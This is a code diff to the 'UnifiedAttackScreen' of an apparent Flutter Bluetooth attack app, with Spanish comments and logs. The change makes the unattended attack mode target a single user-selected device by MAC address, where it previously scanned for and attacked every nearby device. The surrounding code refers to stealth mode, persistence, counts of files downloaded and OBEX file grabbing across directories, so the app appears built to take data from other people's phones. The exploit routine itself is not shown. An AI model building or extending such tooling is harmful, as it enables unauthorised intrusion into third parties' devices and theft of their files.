@@ -1800,22 +1800,22 @@ class _UnifiedAttackScreenState extends State<UnifiedAttackScreen> with SingleTi
       return;
     }
 
-    if (_devices.isEmpty) {
-      _appendLog('📡 Escaneando dispositivos cercanos...');
-      await _scan();
-      await Future.delayed(const Duration(seconds: 5));
-      if (_devices.isEmpty) {
-        _appendLog('❌ No se encontraron dispositivos.');
-        return;
-      }
+    // OBLIGATORIO: Debe haber un dispositivo seleccionado
+    if (_selectedDevice == null) {
+      _appendLog('❌ Selecciona un dispositivo primero.');
+      return;
     }
 
+    final targetAddress = _selectedDevice!['address'] ?? '';
+    final targetName = _selectedDevice!['name'] ?? 'Unknown';
+    
     setState(() => _isUnattendedRunning = true);
     _appendLog('╔══════════════════════════════════════╗');
     _appendLog('║   🤖 MODO DESATENDIDO MEJORADO       ║');
     _appendLog('║   + IA Adaptativa + Análisis         ║');
     _appendLog('╚══════════════════════════════════════╝');
-    _appendLog('📋 ${_devices.length} dispositivos en cola');
+    _appendLog('🎯 Objetivo: $targetName');
+    _appendLog('📍 MAC: $targetAddress');
     _appendLog('⚙️ Configuración:');
     _appendLog('   • Ejecución paralela: ${_enableParallelExecution ? "ON" : "OFF"}');
     _appendLog('   • IA adaptativa: ${_enableAdaptiveIntelligence ? "ON" : "OFF"}');
@@ -1823,7 +1823,7 @@ class _UnifiedAttackScreenState extends State<UnifiedAttackScreen> with SingleTi
     _appendLog('   • Análisis de red: ${_enableNetworkAnalysis ? "ON" : "OFF"}');
     _appendLog('   • Modo sigiloso: ${_stealthMode ? "ON" : "OFF"}');
     _appendLog('   • Persistencia: ${_enablePersistence ? "ON" : "OFF"}');
-    _appendLog('⏱️ Duración estimada: ~${_devices.length * 5} min');
+    _appendLog('⏱️ Duración estimada: ~5 min');
     _appendLog('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━');
 
     int totalFilesDownloaded = 0;
@@ -1837,91 +1837,37 @@ class _UnifiedAttackScreenState extends State<UnifiedAttackScreen> with SingleTi
     final processedAddresses = <String>{};
     final deviceReports = <Map<String, dynamic>>{};
 
+    // === ATAQUE AL DISPOSITIVO SELECCIONADO ===
+    final device = _selectedDevice!;
+    final address = device['address'] ?? '';
+    final name = device['name'] ?? 'Unknown';
     
+    _appendLog('');
+    _appendLog('🎯 Iniciando ataque a: $name');
+    _appendLog('📍 MAC: $address');
+    _appendLog('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━');
 
-    // === BUCLE PRINCIPAL CON RESCANEO ===
-    while (_devices.isNotEmpty) {
-      scanRounds++;
-      _appendLog('');
-      _appendLog('📡 RONDA $scanRounds: ${_devices.length} dispositivos disponibles');
-
-      final devicesToProcess = List<Map<String, dynamic>>.from(_devices);
-      final targets = devicesToProcess.where((d) => !processedAddresses.contains(d['address'])).toList();
-
-      if (targets.isEmpty) {
-        _appendLog('⚠️ Todos los dispositivos ya procesados. Re-escaneando...');
-        await _scan();
-        await Future.delayed(const Duration(seconds: 5));
-        if (_devices.isEmpty) {
-          _appendLog('❌ No hay más dispositivos disponibles.');
-          break;
-        }
-        continue;
-      }
-
-      for (int i = 0; i < targets.length; i++) {
-        if (!_isUnattendedRunning) {
-          _appendLog('🛑 Cancelado por usuario tras $i dispositivos');
-          break;
-        }
-
-        final device = targets[i];
-        final address = device['address'] ?? '';
-
-        // Verificar que el dispositivo aún esté disponible
-        final stillAvailable = _devices.any((d) => d['address'] == address);
-        if (!stillAvailable) {
-          _appendLog('⚠️ Dispositivo $address no disponible. Saltando...');
-          processedAddresses.add(address);
-          continue;
-        }
-
-        try {
-          await _processDeviceUnattended(device, i, targets.length - 1);
-          processedAddresses.add(address);
-        } catch (e) {
-          _appendLog('❌ Error procesando $address: $e');
-          await _saveDeviceReport(address, {
-            'error': e.toString(),
-            'timestamp': DateTime.now().toIso8601String(),
-            'success': false,
-          });
-        }
-
-        await Future.delayed(Duration(seconds: _stealthMode ? 5 : 3));
-      }
-
-      // Si aún hay dispositivos no procesados, re-escanear
-      final remaining = _devices.where((d) => !processedAddresses.contains(d['address'])).length;
-      if (remaining > 0) {
-        _appendLog('⚠️ $remaining dispositivos restantes. Re-escaneando...');
-        await _scan();
-        await Future.delayed(const Duration(seconds: 5));
-      } else {
-        break;
-      }
+    try {
+      await _processDeviceUnattended(device, 0, 0);
+      processedAddresses.add(address);
+    } catch (e) {
+      _appendLog('❌ Error procesando $address: $e');
+      await _saveDeviceReport(address, {
+        'error': e.toString(),
+        'timestamp': DateTime.now().toIso8601String(),
+        'success': false,
+      });
     }
 
-    // Verificar si hay reportes previos de dispositivos ya procesados
-    final savedReports = await _loadAllDeviceReports();
-    if (savedReports.isNotEmpty) {
-      _appendLog('');
-      _appendLog('📋 REPORTES PREVIOS CARGADOS: ${savedReports.length}');
-    }
-
-    // Mostrar resumen final
-    final successRate = totalAttacksSucceeded > 0 ? (totalAttacksSucceeded * 100 ~/ (_devices.length * 20)) : 0;
+    await Future.delayed(Duration(seconds: _stealthMode ? 5 : 3));
 
     _appendLog('');
     _appendLog('╔══════════════════════════════════════╗');
     _appendLog('║   🤖 MODO DESATENDIDO COMPLETADO    ║');
     _appendLog('╚══════════════════════════════════════╝');
     _appendLog('📊 RESUMEN FINAL:');
-    _appendLog('   📡 Rondas de escaneo: $scanRounds');
-    _appendLog('   ⚔️ Dispositivos procesados: ${processedAddresses.length}');
-    _appendLog('   📝 Reportes guardados: ${savedReports.length + processedAddresses.length}');
-_appendLog('   🔄 Dispositivos re-escaneados: ${scanRounds > 1 ? "Sí" : "No"}');
-_appendLog('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━');
+    _appendLog('   🎯 Objetivo: $name ($address)');
+    _appendLog('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━');
   }
 
   // OBEX con reintentos inteligentes en múltiples directorios
